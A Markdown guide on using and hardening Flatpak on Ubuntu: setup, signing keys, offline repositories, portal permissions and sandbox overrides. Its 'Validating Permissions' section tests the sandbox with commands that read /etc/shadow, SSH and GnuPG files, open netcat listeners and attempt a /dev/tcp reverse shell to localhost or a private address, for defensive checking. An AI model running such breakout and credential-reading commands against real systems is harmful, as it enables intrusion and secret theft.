---
draft: false
date: 2024-05-07
categories:
  - flatpak
  - guide
  - package-managers
  - cli
---

# flatpak

Overview of using and configuring flatpak.

<!-- more -->

*This file is originally from [straysheep-dev/linux-configs](https://github.com/straysheep-dev/linux-configs/tree/main/flatpak).*

## References

Full documentation:

- <https://docs.flatpak.org/en/latest/index.html>

Read these first before jumping in:

- <https://github.com/flatpak/flatpak/wiki/Sandbox>

- <https://github.com/flatpak/flatpak/wiki/Metadata>

- <https://github.com/flatpak/flatpak/wiki/Filesystem>

- <https://github.com/flatpak/flatpak/wiki/Portals>

- <https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing>

- <https://docs.flatpak.org/en/latest/conventions.html>

Flatpak documentation is licensed under the `CC-BY 4.0`

- <https://github.com/flatpak/flatpak-docs/blob/master/COPYING>

Examples adapted from stackexchange are also under the `CC-BY 4.0`

- See answer from user Ian here: <https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application>

- <https://stackoverflow.com/legal/terms-of-service#licensing>

- <https://creativecommons.org/licenses/by-sa/4.0/>

Examples adapted from hacktricks use the `CC BY-NC 4.0` (non-commercial)

- <https://github.com/carlospolop/hacktricks/blob/master/LICENSE.md>

---

## Setup

<https://www.flatpak.org/setup/Ubuntu>

```bash
sudo apt install flatpak

# Note: the Software Center app on Ubuntu 20.04 and later is distributed as a snap package, 'snap-store'

# This means following the next step and Installing gnome-software-plugin-flatpak will also install the deb
# version of the Software Center 'gnome-software' effectively a duplicate not confined by snap.
# The 'snap-store' does not currently support installing flatpaks via the GUI, so the CLI is used instead.

# optional step:
sudo apt install gnome-software-plugin-flatpak


flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo

# Also not a bad idea to add the collection ID to this remote for creating offline versions of installed apps for backup:
flatpak remote-modify --collection-id=org.flathub.Stable flathub

reboot
```

### Filesystem Locations

| Location                          | Description                                                   |
| --------------------------------- | ------------------------------------------------------------- |
| `/var/lib/flatpak/*`              | System install location for flatpak applications and runtimes |
| `/var/lib/flatpak/app/`           | System-wide applications                                      |
| `/var/lib/flatpak/runtime/`       | System-wide runtimes                                          |
| `/var/lib/flatpak/sideload-repos` | Persistent offline / local repo path (1.8.0 or later)         |
| `~/.var/app/*`                    | User install location and cwd for flatpak configuration files |
| `/run/user/$UID/doc/*`            | fusefs portal access from within the sandbox                  |
| `/run/flatpak/sideload-repos`     | Ephemeral offline / local repo path  (1.8.0 or later)         |
| `/usr/share/flatpak/portals/*`    | Keys of user-granted portal permissions                       |

### App / Runtime Filesystem Layout (on the host):

`/var/lib/flatpak/(app|runtime)/ID/ARCH/BRANCH`

## Repositories

<https://docs.flatpak.org/en/latest/repositories.html>

### SIgning Keys (Flathub):

Keys are typically stored here:

`gpg /var/lib/flatpak/repo/flathub.trustedkeys.gpg `
```
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
pub   rsa4096/0x4184DD4D907A7CAE 2017-06-16 [SC] [expires: 2027-06-14]
      Key fingerprint = 6E5C 05D9 79C7 6DAF 93C0  8135 4184 DD4D 907A 7CAE
uid                             Flathub Repo Signing Key <flathub@flathub.org>
sub   rsa4096/0x562702E9E3ED7EE8 2017-06-16 [S] [expires: 2027-06-14]
```

You can obtain the remote repo data for use in an offline environemnt with:

```bash
curl -LfO https://flathub.org/repo/flathub.flatpakrepo
```
Extract key material for review with:

```bash
grep GPG ./org.example.app.flatpakref | cut -d '=' -f 2 | base64 -d | gpg
```

You can do the same with individual applications as well, to manually check the signatures and see what key they were signed with.

To obtain the `.flatpakref` for an application which contains it's information and signature, follow a similar process to obtaining the signatures for setting up offline / local remotes:

```bash
curl -LfO 'https://flathub.org/repo/appstream/org.example.app.flatpakref'
```

You can then read the key data with:

```bash
grep GPG ./org.example.app.flatpakref | cut -d '=' -f 2 | base64 -d | gpg
```

### Verifying a flatpak Application

While flatpaks exist within a security sandbox, it's still a good idea to verify you're installing the intended application from the correct developer.

<https://docs.flatpak.org/en/latest/using-flatpak.html#identifiers>

> Flatpak identifies each application and runtime using a unique three-part identifier, such as `com.company.App`. The final segment of this address is the object’s name, and the preceding part identifies the developer, so that the same developer can have multiple applications, like `com.company.App1` and `com.company.App2`.

<https://docs.flatpak.org/en/latest/conventions.html#application-ids>

<https://github.com/flathub/flathub/wiki/App-Requirements#application-id>

> As described in Using Flatpak, Flatpak requires each application to have a unique identifier, which has a form such as `org.gnome.Dictionary`.

> The format is in reverse-DNS style so the first section is generally a domain controlled by the project and the trailing section represents the specific project. There are some exceptions to this, such as extensions using the base application-id of the project they extend rather than their own.

> As will be seen below and in future sections, this ID is expected to be used in a number of places. Developers must follow the standard D-Bus naming conventions for bus names when creating their own IDs. This format is already recommended by the Desktop File specification and Appstream specification also.

The above seems to indicate that extensions can use an existing application ID, but may **not necessarily be maintained by the same developer**.

Ways you can verify you have the correct flatpak:

- Check the developer's documentation on how and where to obtain the application, it should point to an official flatpak.
- Check the flatpak id, it's often formatted as `tld.developer.application`
- On the application's flathub page `https://flathub.org/apps/details/<tld.developer.application>` go to Publisher, then `See details`, confirm the developer is a contributer.
- Alternatively, browser to `https://github.com/flathub/<tld.developer.application>` and review the contributers.

## General Commands

<https://docs.flatpak.org/en/latest/using-flatpak.html>

```bash
# find applications
flatpak search gimp

# show info about remote applications
flatpak remote-info flathub org.gnome.Recipes

# obtain a log of all previous versions of the application
flatpak remote-info --log flathub org.gnome.Recipes

# downgrade or install a previous version
sudo flatpak update --commit=ec07ad6c54e803d1428e5580426a41315e50a14376af033458e7a65bfb2b64f0 org.gnome.Recipes

# update an application to the latest version
sudo flatpak update org.gnome.Recipes

# update all applications and runtimes
sudo flatpak update

# install an applicaiton
flatpak install gimp

# show installed flatpak data
flatpak list

# show information on an installed pacakge
flatpak info gimp

# pin a package to a version (prevent updates)
flatpak mask org.gnome.Recipes

# run an application
flatpak run org.gimp.GIMP

# inspect running apps
flatpak ps

# terminate a process
flatpak kill <application-id>

# show a table of all permissions granted via portals to the application(s)
flatpak permissions
```

## Advanced Usage

Configuring resource limits for apps

<https://docs.flatpak.org/en/latest/tips-and-tricks.html#configuring-resource-limits-for-apps>

When systemd is available, Flatpak tries to put app processes in a scope such

as ``app-com.brave.Browser-*.scope`` (in the case of Brave), with ``*`` replaced by

an arbitrary suffix. This means you can create a file like

``~/.config/systemd/user/app-flatpak-com.brave.Browser-.scope.d/memory.conf``

with contents like::

```
  [Scope]
  MemoryHigh=1G
```

Then after a ``systemctl --user daemon-reload``, those

``systemd.resource-control(5)`` parameters will apply to all instances of that

app.

---

## Creating Applications To-Go

Create offline / local copies of applications as backups or specific versions or to install on offline machines.

**Summary**

1. `flatpak install flathub org.example.app`

2. `flatpak create-usb . org.example.app` **NOTE**: you may also need to do this for all required runtimes

	3.1 place the `.ostree` directory into a mounted folder and run `flatpak install flathub org.example.app`
	or
	3.2 run `flatpak install --sideload-repo=/path/to/.ostree/repo flathub org.example.app`

- <https://docs.flatpak.org/en/latest/usb-drives.html>

- <https://blogs.gnome.org/mclasen/2018/08/26/about-flatpak-installations/>

- <https://github.com/flatpak/flatpak-docs/commit/5febc66828e485a3632e97b78030aad433544896>

- <https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak>

- <https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak-create-usb>

- <https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application>

If you're familiar with `snap` packages, this effectively gives you the `.snap` and `.assert` equivalent, the app, runtimes, and valid gpg signatures. With flatpak, it's in the form of a local repository, meaning a directory of the application with all of the necessary data to install it offline.

To create, or essentially download a flatpak application either to have as an offline backup, a specific version, or to transfer to an airgapped machine, there are two ways to do this which depend on which `flatpak --version` you're running.

This is ideal for running tests on various versions of an application without burning a large amount of data uninstalling then redownloading, both for yourself and for the flatpak remote server you're pulling from.

This example uses the following:

- flathub as the remote repo.
- org.gnome.Recipes as the application

---

First install the target application (you need to install it to create the offline / local version), then gather and configure, the following information:

```bash
# obtain the full application id, which is in the next step is 'org.gnome.Recipes'
flatpak list --app
# obtain the name of the remote repo
flatpak info -o org.gnome.Recipes
# using the name obtained in the previous step, check the Collection ID field of the remote repo:
flatpak remotes -d

# typically if you did not configure this already, even for flathub it will be blank.
# this step is required for the correct metadata to be in the application when making the offline / local version
# so that signature verification can still take place.
# we can add this manually using the following:
flatpak remote-modify --collection-id=org.flathub.Stable flathub
```

Next, get a copy of the remote repo's metadata and gpg signature.

You'll want to do this if you are moving the application to an offline environment that doesn't already have the remote repo configured. Using the `flathub.flatpakrepo` file you can replicate the initial setup steps entirely offline.

```bash
curl -LfO https://flathub.org/repo/flathub.flatpakrepo
```

Now create the offline / local copy of the application.

This is simply a directory of the applicaiton data which can be moved around and installed from elsewhere. We'll create it in the current working directory for now.

```bash
flatpak create-usb . org.gnome.Recipes
# you'll see output explaining what's being written, and how much is left to write

# check for the .ostree directory
ls -la

total 12
drwxrwxr-x 3 user user 4096 Apr 20 18:58 .
drwxrwxr-x 3 user user 4096 Apr 20 18:58 ..
drwxr-xr-x 3 user user 4096 Apr 20 18:58 .ostree
```
**TIP**: Additionally, you can use `create-usb` in this exact same directory just like before, to add other applications to this `.ostree` repo.

### Installing the Local / Offline Application

If the environment is completely offline and does not have the inital setup of remotes, be sure to use the `flathub.flatpak` file:

```bash
# must be done from a local repo search path, such as a mounted device prior to flatpak 1.8.0; we'll create one
sudo mkdir /media/$USERNAME/local
sudo mount --bind /media/$USERNAME/local /media/$USERNAME/local
sudo cp ./flathub.flatpakrepo /media/$USERNAME/local
cd /media/$USERNAME/local

sudo flatpak remote-add --if-not-exists flathub ./flathub.flatpakrepo
sudo flatpak remote-modify --collection-id=org.flathub.Stable flathub

sudo umount /media/$USERNAME/local
sudo rm -rf /media/$USERNAME/local
```


### Flatpak 1.8.0 or later

Flatpak searches these two directories...

- `/run/flatpak/sideload-repos`
- `/var/lib/flatpak/sideload-repos`

...as local repos, looking for the `.ostree/repo` subdirectories within them.

These locations can contain symlinks to the offline application's diectory.

To create a temprorary local repo, use the /run location here:

```bash
# using /run/flatpak/sideload-repos:
sudo mkdir -p /run/flatpak/sideload-repos
sudo chmod 755 /run/flatpak/sideload-repos
sudo ln -s /path/to/<local-repo> /run/flatpak/sideload-repos/<local-repo>

# where /path/to/<local-repo> could look like: /media/user/flatpaklocal
# making the symlink: /run/flatpak/sideload-repos/flatpaklocal
```

If you want this to be persistent, use the /var location here:

```bash
# using /var/lib/flatpak/sideload-repos:
sudo mkdir /var/lib/flatpak/sideload-repos
sudo chmod 755 /var/lib/flatpak/sideload-repos
sudo ln -s /path/to/<local-repo> /var/lib/flatpak/sideload-repos/<local-repo>

# where /path/to/local/<repo> could look like: /media/user/flatpaklocal
# making the symlink: /var/lib/flatpak/sideload-repos/flatpaklocal
```

### Flatpak prior to 1.8.0

This didn't make sense until adding the `--ostree-verbose` argument to the install command (at the time of writing Flatpak 1.6.5).

```bash
flatpak install --ostree-verbose flathub org.gnome.Recipes

# reading the output showed the following line:
F: ostree_repo_finder_mount_resolve_async: Found 2 mounts
```

After mounting the directory made for the local repo as a bind mount, flatpak immediately picked up the application.

```bash
sudo mkdir /media/$USERNAME/flatpaklocal
sudo mv .ostree -t /media/$USERNAME/flatpaklocal
sudo mount --bind /media/$USERNAME/flatpaklocal /media/$USERNAME/flatpaklocal
# now the filesystem sees the local repo directory as a mounted device
```

Lastly, install your application(s) as normal:

```bash
flatpak install flathub org.gnome.Recipes
```

Again, running `--ostree-verbose` with the install command will show the local repo is found, and signatures are verified.

---

## Explore an Application Sandbox

Run another command within the security context of the application

- <https://github.com/flatpak/flatpak/wiki/Sandbox#the-current-flatpak-sandbox>

- <https://docs.flatpak.org/en/latest/debugging.html#running-debugging-tools>

```
# extremely useful for debugging and validating permission overrides
flatpak run --command=bash org.gimp.GIMP
```

### File-Chooser Portal / Database

<https://github.com/flatpak/flatpak/wiki/Portals#the-filechooser-portal>

The following commands will show you all permissions **granted by the user**, from GUI interaction with the portal mechanism (dialogues).

- <https://docs.flatpak.org/en/latest/debugging.html#inspecting-portal-permissions>

This is described here: <https://flatpak.github.io/xdg-desktop-portal/#gdbus-org.freedesktop.portal.FileChooser>

```
# show permissions per app, or for all apps
flatpak permissions
flatpak permission-list
flatpak permission-show org.gimp.GIMP

# example output, testing portal permissions:
Table      Object     App                    Permissions                  Data
documents  546354f8   com.giuspen.cherrytree read,write,grant-permissions (b'/etc/passwd', 2050, 131073, 0)
documents  d82b71a9   com.giuspen.cherrytree read,write,grant-permissions (b'/home/user/.ssh/id_rsa', 2050, 2490370, 0)
documents  6c55c619   com.giuspen.cherrytree read,write,grant-permissions (b'/boot/test.ctz.pdf', 2050, 262145, 0)
documents  d5917d15   com.giuspen.cherrytree read,write,grant-permissions (b'/etc/test.pdf', 2050, 131073, 0)
documents  514101fb   com.giuspen.cherrytree read,write,grant-permissions (b'/home/user/Documents/test', 2050, 262930, 0)
documents  df008b13   com.giuspen.cherrytree read,write,grant-permissions (b'/home/user/.gnupg/gpg.conf', 2050, 2493681, 0)

# running reset will take away those permissions until you manually 'grant' them again by manually selecting or opening those files via a dialogue.
# this means until you revoke permission, you can access all of these files via a shell from within the application sandbox
flatpak permission-reset com.giuspen.cherrytree

Table      Object     App                    Permissions                  Data
documents  546354f8                                                       (b'/etc/passwd', 2050, 131073, 0)
documents  d82b71a9                                                       (b'/home/user/.ssh/id_rsa', 2050, 2490370, 0)
documents  6c55c619                                                       (b'/boot/test.ctz.pdf', 2050, 262145, 0)
documents  d5917d15                                                       (b'/etc/test.pdf', 2050, 131073, 0)
documents  514101fb                                                       (b'/home/user/Documents/test', 2050, 262930, 0)
documents  df008b13                                                       (b'/home/user/.gnupg/gpg.conf', 2050, 2493681, 0)
```

The above example was done with strict global overrides. This table shows every time a permission was manually granted by the user via a 'save as' style window when importing and exporting data with CherryTree.

To see where copies of host files are made available to the sandbox, run `ls -l /run/user/1000/doc` to find folders relating to each object ID. This is the file-chooser portal's database, tracking all files accessed by sandboxed apps.

---

## Sandbox Overview

<https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes>

Both the application and it's runtimes operate within the defined sandbox.

Runtimes adhere to the permissions granted to the application itself.

### Sandbox Permissions

See this page for an overview of permissions:

<https://docs.flatpak.org/en/latest/sandbox-permissions.html>

And this page for a complete reference:

<https://docs.flatpak.org/en/latest/sandbox-permissions-reference.html>

---

### D-Bus Access

<https://docs.flatpak.org/en/latest/sandbox-permissions.html#d-bus-access

Applications exist in their own namespace, and typically do not need access beyond that.

Media controls, for example, would be an exception (see the above link for details).

### Monitoring D-Bus

<https://wiki.ubuntu.com/DebuggingDBus>

<https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.md>

```bash
sudo apt install -y d-feet gdbus

# monitor dbus session
dbus-monitor

# monitor system dbus session
# see https://wiki.ubuntu.com/DebuggingDBus for configuration changes
sudo dbus-monitor --system

# or
sudo busctl monitor
```

### Portals

<https://docs.flatpak.org/en/latest/sandbox-permissions.html#portals>

<https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing>

Complete API reference:

- <https://flatpak.github.io/xdg-desktop-portal/>

Portals handle the following actions, and require user interaction for the action to take place:

- Opening files with a native file chooser dialog
- Opening URIs
- Printing
- Showing notifications
- Taking screenshots
- Inhibiting the user session from ending, suspending, idling or getting switched away
- Getting network status information

GTK3 and Qt5 have support for portals built-in, while applications not using either can refer to this documentation:

- <https://flatpak.github.io/xdg-desktop-portal/portal-docs.html>

From the portal docs:

```
The FileChooser portal allows sandboxed applications to ask the user for access to files outside the sandbox.
The portal backend will present the user with a file chooser dialog.

The selected files will be made accessible to the application via the document portal,
and the returned URI will point into the document portal fuse filesystem in /run/user/$UID/doc/.

This documentation describes version 3 of this interface.
```

If you run `ls -l /run/user/1000/doc` you'll find the fusefs entries for each object ID in `flatpak permission-show`. This is where permitted files are copied so that the sandbox may access them while still keeping the host [files] shielded.

---

When reviewing and validating the boundaries of the security sandbox, one thing that can be confusing is when a portal transparently opens nautilus (or your system's file viewer) in an unrestricted context, when other times it may not be using a portal, and will adhere to the permissions / overrides you'd expect.

We'll use nautilus as an example, it is a common filesystem browser utility (like windows explorer). The process can be spawned simply by opening your folder application.

What to look for is when a portal is used, you will be able to traverse your entire filesystem as nautilus may not be sandboxed in the same way your flatpak app is.

The CherryTree (flatpak) has a few options under File > Export:

- Export to plain text
	* Select any additional options from here, but notice you're confined to browsing only within the defined filesystem sandbox boundaries in this prompt
- Export to [option]
	* Any of the other options here allow you to fully traverse the filesystem outside of the sandbox since this is a portal, a separate process.
	* Choose to save a document outside of the sandbox
	* Running `flatpak permission-show com.giuspen.cherrytree` will show every location accessed outside of the sandbox via portals.

---

## User Defined Permissions (flatpak override)

Modify the application's sandbox and permissions.

### Global Overrides

Users can define a global override policy, for example:

```bash
sudo flatpak override --nofilesystem=host

flatpak override --show

[Context]
filesystems=!host;
```
This will prevent **all** flatpak applications from accessing the host filesystem unrestricted.

This can be ideal, as many applications come with unrestricted 'host' enabled by default ('host' meaning all non-system files are accessible to the app).

The following is one approach, using a global 'deny all', then allowing only what's necessary in an application's specific overrides:


### System-Wide Overrides:

`/var/lib/flatpak/overrides/global`

```
[Context]
filesystems=!host;
shared=!network;!ipc;

[Session Bus Policy]
org.gtk.vfs.*=none
org.gtk.vfs=none
```

### A Note On gvfs

According to this, applications should not be using `org.gtk.vfs` in their permissions.

<https://docs.flatpak.org/en/latest/sandbox-permissions.html#gvfs-access>

```bash
sudo flatpak override --no-talk-name="org.gtk.vfs"
sudo flatpak override --no-talk-name="org.gtk.vfs.*"
```

### Application Level Overrides:

`/var/lib/flatpak/overrides/org.gimp.GIMP`

```
[Context]
filesystems=~/snap/flatpakaccess/gimp:create;

[Session Bus Policy]
org.freedesktop.FileManager1=none
```

<https://github.com/flatpak/flatpak/issues/4643>

### Runtimes and Sandboxing

- <https://github.com/flatpak/flatpak/wiki/Metadata#runtime-metadata>

- <https://docs.flatpak.org/en/latest/basic-concepts.html#sandboxes>

Each sandbox contains an application and its runtime.

Same as for applications it is possible to override environment variables for entire runtimes. The overrides for runtime environment variables are applied before application overrides, so if both runtime and application override the same environment variable, the value within the application metadata file wins.

**Global overrides cover both, applications and their runtimes**.

---

To view an applications default permissions, find the `metadata` file:

```bash
find /var/lib/flatpak/ -name "metadata" -ls

cat /var/lib/flatpak/app/<app-name>/path/to/metadata
```

### The Override Command

To modify the default permissions of an application, use the `override` command.

<https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=manaing%20portal%20permissions#flatpak-override>

`flatpak override [OPTION...] [APP] - Override settings [for application]`

The `--[option]=VALUE` has tab completion for the VALUE.

```bash
flatpak override --nosocket=wayland org.gnome.gedit

flatpak override --filesystem=home org.mozilla.Firefox

sudo flatpak override --unshare=network org.gimp.GIMP
```

Taking the following steps should result in no network access for the application:

```bash
sudo flatpak override --unshare=network org.gimp.GIMP

# overrides policy at /var/lib/flatpak/overrides/org.gimp.GIMP

flatpak override --show org.gimp.GIMP

# [Context]
# shared=!network;

flatpak run --command=bash org.gimp.GIMP

curl https://google.com:443
#	curl: (7) Couldn't connect to server

sudo flatpak override --reset org.gimp.GIMP

flatpak override --show org.gimp.GIMP
# this should now return an empty result
```

Next try removing access to a specific directory:

**NOTE**: FILESYSTEM can be one of (This option can be used multiple times):
- home
- host
- host-os
- host-etc
- xdg-desktop
- xdg-documents
- xdg-download
- xdg-music
- xdg-pictures
- xdg-public-share
- xdg-templates
- xdg-videos
- an absolute path
- or a homedir-relative path like ~/dir

```bash
echo 'user:pass' > ~/Music/pass.txt

sudo flatpak override --nofilesystem=~/Music org.gimp.GIMP

ls -l ~/Music/

# total 4
# -rw-rw-r-- 1 user user 10 Apr 2 00:00 pass.txt

flatpak run --command=bash org.gimp.GIMP

ls -l ~/Music/

# total 0
```

Note that with `--filsystem=host` flatpak remounts the host's `/etc/*` folder under `/var/run/host/etc/*` within the sandbox, meaning those files are all still there, just as a read-only tmpfs.

Another interesting exercise is when running both snap packages and flatpak apps on the same system, they don't necessarily respect all of the other's default access controls.

For example, snaps typically cannot read other snap's directories, or any directory you may create under ~/snap (ignoring the other /snap and /tmp/snap* directories for now, though they too are read / write protected).

We'll use an example where we need to install GIMP on a workstation, where all of the other applications are installed and managed through snapd.

We can integrate GIMP on a system like that with this:

```bash
sudo flatpak override --nofilesystem=host org.gimp.GIMP

sudo flatpak override --filesystem=~/snap/flatpakaccess/gimp:create org.gimp.GIMP

cat /var/lib/flatpak/overrides/org.gimp.GIMP

# [Context]
# filesystems=!host;~/snap/flatpakaccess/gimp:create;

flatpak run org.gimp.GIMP
```

This allows:

- A folder of `~/snap/flatpakaccess/gimp` to be created (if it doesn't exist) and written to.
- GIMP to save it's data to a `~/snap` directory, preventing other snaps from reading those files.
- GIMP cannot see anything outside of it's own sandboxed application directory (a tmpfs mount), and the snap directory assigned to it via the override.
	* This view of the filesystem is extremely limited, you can examine the sandbox with `flatpak run --command=bash org.gimp.GIMP`

## Validating Permissions

This is a quick reference of how to validate your application is adhering to the correct permissions:

```bash
flatpak run --command=bash <application-name>
```

You now have a shell in the context of the application's security sandbox.

Try to access protected items or make remote connections:

```bash
sudo -l
cat /etc/shadow
curl https://google.com
nc -nvlp 8080
command -v pkexec
ls -l /tmp/snap.<snap-pacakge>
ls -laR ~/.gnupg
find ~/.ssh -type f -ls
```

You'll see if you follow along in `wireshark`, `tcpdump`, `tshark` or similar, the connection is never made -- no packets will leave the host. More specifically, no packets leave the sandbox.

Try to breakout with a simple shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")' ; cat /etc/shadow
```

Try to create an http server (it should actually succeed here, but only exists within the sandbox and is not visible by the host):

```bash
python3 -m http.server 8080 --bind 127.0.0.1;
# in another terminal on the host, try (this should fail):
curl http://127.0.0.1:8080
# see if it's visible to the host, it should not be visible or accessible from outside of the sandbox
netstat -antup
```

Try another breakout

```bash
# https://github.com/carlospolop/hacktricks/blob/master/linux-unix/useful-linux-commands/bypass-bash-restrictions.md
# setup a listener outside the security sandbox on the host
nc -nvlp 4400 -s 127.0.0.1
# from within the sandbox try:
(sh)0>/dev/tcp/127.0.0.1/4400
# it should fail if shared=!network is set
# it should also fail even if you try to reach the host machine's local network address
# if it doesn't fail, you'll get the following:
Connection received on 127.0.0.1 40864
# in that window, enter this to complete the breakout:
exec >&0
```

Try to execute OS commands with python:

```bash
python3 -c 'import os; os.system("/usr/bin/whoami")'
python3 -c 'import os; os.system("/usr/bin/sudo -l")'
python3 -c 'import os; os.system("/usr/bin/nc -nvlp 4000")'
python3 -c 'import os; os.system("/usr/bin/curl http://172.20.111.1")'

sh-5.1$ python3 -c 'import os; os.system("(sh)0>/dev/tcp/172.20.111.1:443")'
sh: line 1: /dev/tcp/172.20.111.1:443: No such file or directory
```

Another intersting way to view activity is in the system IO, with `pspy`:

```bash
# on the host outside of the sandbox:
# replace pspy64 with pspy32 if on x86
curl -sSLO 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64'
sha256sum ./pspy64 | grep 'f7f14aa19295598717e4f3186a4002f94c54e28ec43994bd8de42caf79894bdb'
chmod +x ./pspy64
./pspy64
```

This will show you commandline information of all running processes including flatpak applications.

Try running your flatpak app again with `--command=bash` and see what commands you can pick up with `pspy` running in another window.

---

One final exercise, in looking for files that applications typically create in a `/tmp` directory, but are now being created within the container, rendered no results with `sudo find / -type <type> -name "<regex>" -ls 2>/dev/null`

However these files can be seen from within the container when using the `flatpak run --command=bash org.example.app`

Where exactly is this location from the context of the host?

Oddly enough, Sysmon (for Linux) can see these files being created / deleted by applications in a sandbox:

```
Event SYSMONEVENT_FILE_CREATE
	RuleName: -
	UtcTime: 2022-04-05 01:02:03.998
	ProcessGuid: {abcd1234-1234-aabb-ccdd-0000000000}
	ProcessId: 142327
	Image: /newroot/app/var/lib/flatpak/app/org.example.app/x86_64/stable/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789/files/bin/example
	TargetFilename: /newroot/tmp/.ZLX123/file.txt
	CreationUtcTime: 2022-04-05 01:02:03.998
```

Looking for `/newroot` online leads to this commit, closing issue #305, showing that the default mount point is `/tmp/newroot`, updated from previous paths that were used.

- <https://github.com/containers/bubblewrap/commit/efc89e3b939b4bde42c10f065f6b7b02958ed50e>

The first paragraph in the usage for `bwrap` also explains this chroot-like environment is completely invisible to the normal host:

- <https://github.com/containers/bubblewrap#usage>

---

